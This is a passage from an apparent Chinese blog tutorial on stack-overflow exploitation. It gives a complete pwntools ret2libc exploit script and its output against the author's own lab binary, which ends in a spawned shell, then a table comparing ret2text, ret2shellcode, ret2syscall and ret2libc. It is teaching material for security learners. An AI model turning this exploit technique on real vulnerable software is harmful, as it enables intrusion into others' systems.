+<p><img src="https://files.seeusercontent.com/2026/03/30/Fgz4/pasted-image-1774861961046.webp" alt=""></p>
+<p>可以看到搜到很多版本，因为很多版本的函数的偏移值是一样的，所以就需要多泄露几个函数来交叉搜索。找到对应的版本的libc把他下载下来就好了，后续的流程是一样的。</p>
+<p>还有一种就是使用<code>LibcSearcher</code>库来自动搜索libc库，相当于把上面的网站查询功能放到了程序执行的过程中，你也可以自己写一个，执行的效果就像下面这样</p>
+<p><img src="https://files.seeusercontent.com/2026/03/30/fSf7/pasted-image-1774867051725.webp" alt=""></p>
+<p>但是因为要尝试很多次，我就干脆不用这个方法了，我直接绑定解析了用来编译这个程序的库：</p>
+<pre class="code-block language-py" data-language="PY"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-py"><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * 
+
+sh = process(<span class="hljs-string">&quot;./ret2libc&quot;</span>)
+elf = ELF(<span class="hljs-string">&quot;./ret2libc&quot;</span>)
+
+put_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]
+puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]
+gets_got = elf.got[<span class="hljs-string">&quot;gets&quot;</span>]
+main_addr = elf.symbols[<span class="hljs-string">&quot;main&quot;</span>]
+
+offset = <span class="hljs-number">0x48</span> + <span class="hljs-number">0x4</span>
+payload1 = <span class="hljs-string">b&quot;A&quot;</span> * offset 
+payload1 += p32(put_plt) + p32(main_addr) + p32(puts_got)
+sh.sendline(payload1)
+
+echo = sh.recvline()
+puts_addr = u32(sh.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)[:<span class="hljs-number">4</span>].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))
+
+<span class="hljs-comment"># 这个是我电脑上的libc，一般题目会直接给出，如果没有就需要用上面的方法查询</span>
+libc = ELF(<span class="hljs-string">&quot;/usr/lib32/libc.so.6&quot;</span>)
+libc_base = puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]			<span class="hljs-comment"># 计算libc基址</span>
+system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]		 <span class="hljs-comment"># 计算出system函数的真实地址 </span>
+binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))	 <span class="hljs-comment"># 计算出字符串/bin/sh的真实地址</span>
+
+<span class="hljs-comment"># 接下来就和ret2text是一样的</span>
+payload = <span class="hljs-string">b&quot;A&quot;</span> * offset + p32(system_addr) + <span class="hljs-string">b&quot;AAAA&quot;</span> + p32(binsh_addr)
+
+sh.sendline(payload)
+sh.interactive()    
+</code></pre>
+<p>最终得到运行结果：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">&gt; python3 exp.py
+[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./ret2libc&#x27;</span>: pid 29355
+[*] <span class="hljs-string">&#x27;/home/Ylin/PWN/ret2libc&#x27;</span>
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+[+] puts addr: 0xf7d662a0
+[+] gets addr: 0xf7d65670
+[*] <span class="hljs-string">&#x27;/usr/lib32/libc.so.6&#x27;</span>
+    Arch:       i386-32-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+[*] Switching to interactive mode
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \xc2\xd3\xf7AAAAR\xee\xea\xf7
+$ <span class="hljs-built_in">ls</span>
+exp.py       LibcSearcher.py  ret2libc      ret2libc.id1  ret2libc.nam  test.c
+ida-mcp-env  __pycache__      ret2libc.id0  ret2libc.id2  ret2libc.til
+</code></pre>
+<h3 id="总结">总结</h3>
+<p>首先需要明确什么时候该利用哪些方法，不要舍近求远：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"></th>
+<th style="text-align:left">原理</th>
+<th style="text-align:left">场景</th>
+<th style="text-align:left">关键</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>ret2text</strong></td>
+<td style="text-align:left">跳转到<code>.text</code>段已有的后门函数</td>
+<td style="text-align:left">程序自带<code>system(&quot;/bin/sh&quot;)</code></td>
+<td style="text-align:left">计算偏移，直接覆盖返回地址</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>ret2shellcode</strong></td>
+<td style="text-align:left">注入shellcode并执行</td>
+<td style="text-align:left">栈有可执行权限（NX关闭）</td>
+<td style="text-align:left">shellcode编写，地址泄露（绕过ASLR）</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>ret2syscall</strong></td>
+<td style="text-align:left">构造ROP链执行系统调用</td>
+<td style="text-align:left">NX开启，但无libc可用</td>
+<td style="text-align:left">寻找gadget，构造系统调用参数</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>ret2libc</strong></td>
+<td style="text-align:left">利用libc中的函数</td>
+<td style="text-align:left">NX开启，程序动态链接</td>
+<td style="text-align:left">泄露libc地址，计算基址</td>
+</tr>
+</tbody>
+</table>
+<p>理解并使用这些漏洞的关键在于：</p>
+<ul>
+<li>理解内存布局（C语言内存布局是学习PWN的基础）</li>
+<li>掌握调用约定</li>
+<li>熟练使用调试工具（gdb/pwndbg）</li>
+<li>动手实践（你需要实践来验证自己的猜想，pwn需要记住的东西很多）</li>
+</ul>
+<p>上面的这几个例子都是我编写的具体情况，实际的漏洞利用过程中用法是综合的。并不会这么简单，这些实验只是直观的帮助大家认识这些漏洞利用的过程。而且很多调试的过程并不是一次就能成功的，还有一些过程有一定的猜测成分。但是漏洞利用从来不是非此即彼的过程，而是环环相扣的。很多时候一个地址的泄露是为了后面的过程做好铺垫，一点一点的获取信息，一步一步的打造ROP链。</p>
+<p>初学的时候可能会对很多机制感到很陌生，比如什么是<code>系统调用</code>、<code>plt/got</code>、<code>ASLR</code>…这些都需要去查阅资料才能帮助你更好了解这些过程，AI是很好的工具，大多数的问题都能为你回答。遇到实在拿不准的标准，可以去查看官方文档，不要嫌麻烦，这也是一种积累。</p>
+
+
+<nav class="pager">
+  
+    <a class="pager__link pager__link--prev" href="../121-记录一次wsl的配置/index.html">prev</a>
+  
+  <a class="pager__link pager__link--home" href="../../index.html">home</a>
+  
+    <a class="pager__link pager__link--next" href="../123-PWN-2/index.html">next</a>
+  
+</nav>
+
+</article>
+          <footer class="site-footer">
+  <div class="site-footer__inner">
+    <span>Articles: 132</span>
+    <span>Words: 289963</span>
+  </div>
+</footer>
+
+        </section>
+        <aside class="layout__sidebar">
+          <div class="toc-panel">
+  <h2 class="toc-panel__title">目录</h2>
+  
+  
+  
+    <nav class="toc" aria-label="Contents"><ol class="toc__list">
+  
+    <li class="toc__item toc__item--level-2">
+      
+        <details class="toc__folder">
+          <summary class="toc__target toc__summary" data-slug="栈溢出-上">栈溢出(上)</summary>
+          <ol class="toc__list">
+  
+    <li class="toc__item toc__item--level-3">
+      
+        <a class="toc__target toc__link" href="#栈溢出的原理" data-slug="栈溢出的原理">栈溢出的原理</a>
+      
+    </li>
+  
+    <li class="toc__item toc__item--level-3">
+      
+        <a class="toc__target toc__link" href="#ret2text" data-slug="ret2text">ret2text</a>
+      
+    </li>
+  
+    <li class="toc__item toc__item--level-3">
+      
+        <a class="toc__target toc__link" href="#ret2shellcode" data-slug="ret2shellcode">ret2shellcode</a>
+      
+    </li>
+  
+    <li class="toc__item toc__item--level-3">
+      
+        <a class="toc__target toc__link" href="#ret2syscall" data-slug="ret2syscall">ret2syscall</a>
+      
+    </li>
+  
+    <li class="toc__item toc__item--level-3">
+      
+        <a class="toc__target toc__link" href="#ret2libc" data-slug="ret2libc">ret2libc</a>
+      
+    </li>
+  
+    <li class="toc__item toc__item--level-3">
+      
+        <a class="toc__target toc__link" href="#总结" data-slug="总结">总结</a>
+      
+    </li>
+  
+</ol>
+        </details>
+      
+    </li>
+  
+</ol></nav>
+  
+
+</div>
+
+        </aside>
+      </main>
+    </div>
+  </div>
+<script src="../../assets/site.js" defer></script>
+
+</body>
+
+</html>
